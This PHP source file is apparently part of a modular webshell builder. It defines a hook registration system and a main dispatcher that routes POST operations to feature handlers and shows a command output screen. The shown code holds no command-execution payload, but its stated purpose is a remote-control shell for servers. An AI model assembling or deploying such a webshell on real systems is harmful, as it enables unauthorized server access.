<?php

// section.functions

/**
 * Hooks container
 */
$hooks = array(
    // Hooks that are called directly before any page is rendered, useful to enforce authentication and similar
    "page_generation" => array(),
    // Hooks that are called to add isolated operations, isolated operations are operations that must be run in an
    // isolated environment meaning no other content should be rendered on the page except the operation result.
    // Example: file download, redirects, etc.
    "isolated_ops"    => array(),
    // Hooks that are called to add register features to the webshell
    "features"        => array(),
    // Named hooks that are called to render a page, ONLY the first matching hook is called.
    // This is a named array (aka object) => [hook_name => function1, hook_name => function2, ...]
    "GET_page"        => array(),
    // Named hooks that are called to handle a POST request, ONLY the first matching hook is called.
    // This is a named array (aka object) => [hook_name => function1, hook_name => function2, ...]
    "POST_operation"  => array(),
);

/**
 * Register a hook
 *
 * @param $hook string The hook to register
 * @param $function string|array The function to call or call_user_func compatible array
 *
 * @return void
 */
function add_hook($hook, $function) {
    global $hooks;

    $hooks[$hook][] = $function;
}

/**
 * Register a named hook
 *
 * @param $hook string The hook to register
 * @param $name string The name of the hook
 * @param $function string|array The function to call or call_user_func compatible array
 *
 * @return void
 */
function add_named_hook($hook, $name, $function) {
    global $hooks;

    // If the hook is already registered any new registration is ignored
    if (!empty($hooks[$hook][$name])) {
        return;
    }

    $hooks[$hook][$name] = $function;
}

/**
 * Call a hook
 *
 * @param $hook string The hook to call
 * @param $arguments array The arguments to pass to the hook (by reference)
 *
 * @return void
 */
function call_hook($hook, &$arguments = array()) {
    global $hooks;

    foreach ($hooks[$hook] as $function) {
        call_user_func_array($function, $arguments);
    }
}

/**
 * Call a named hook
 *
 * @param $hook string The hook to call
 * @param $name string The name of the hook
 * @param $arguments array The arguments to pass to the hook (by reference)
 *
 * @return void
 */
function call_named_hook($hook, $name, &$arguments = array()) {
    global $hooks;

    // If the hook is not registered, fail silently
    if (empty($hooks[$hook][$name])) {
        return;
    }

    call_user_func_array($hooks[$hook][$name], $arguments);
}

// section.functions.end

// inject: section.constants
// inject: file://./helpers.php
// inject: section.functions
// inject: sections.hooks

// section.main
date_default_timezone_set("UTC");
$css = '__CSS__';

// Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
// on the page except the operation result.
$ISOLATED_OPERATIONS = array();
// Load the isolated operations
$args = array(&$ISOLATED_OPERATIONS);
call_hook("isolated_ops", $args);

/**
 * Define the enabled features
 *
 * @var array{title: string, description: string, svg: string, hidden?: bool, op: string}[] $ENABLED_FEATURES
 */
$ENABLED_FEATURES = array();
// Load the enabled features
$args = array(&$ENABLED_FEATURES);
call_hook("features", $args);

// Check if the request is not POST and the operation is not in the isolated operations list, if that is the case,
// render the page
if (
    !__PREFIX__isPost() ||
    !__PREFIX__isIsolatedOperation($_POST["__OPERATION__"], $ISOLATED_OPERATIONS)
) {
    // load the page or get the fallback page
    $page = __PREFIX__loadPageOrDefault($ENABLED_FEATURES);
    __PREFIX__renderPage($ENABLED_FEATURES, $page);

    // Check if the request is POST and the operation is not in the isolated operations list,
    // if that is the case open the command output screen to display the command output
    if (
        __PREFIX__isPost() &&
        !__PREFIX__isIsolatedOperation($_POST["__OPERATION__"], $ISOLATED_OPERATIONS)
    ) {
        __PREFIX__openCommandOutputScreen();
    }
}

// ensure the operation is a POST request, if so, call the operation handler
if (__PREFIX__isPost()) {
    $operation = $_POST["__OPERATION__"];
    $args      = array($operation, $ENABLED_FEATURES);
    call_named_hook("POST_operation", $operation, $args);
}

// If the request is not POST and the operation is not in the isolated operations list, close the command output screen
if (
    !__PREFIX__isPost() &&
    !__PREFIX__isIsolatedOperation($_POST["__OPERATION__"], $ISOLATED_OPERATIONS)
) {
    __PREFIX__closeCommandOutputScreen();
}

// section.main.end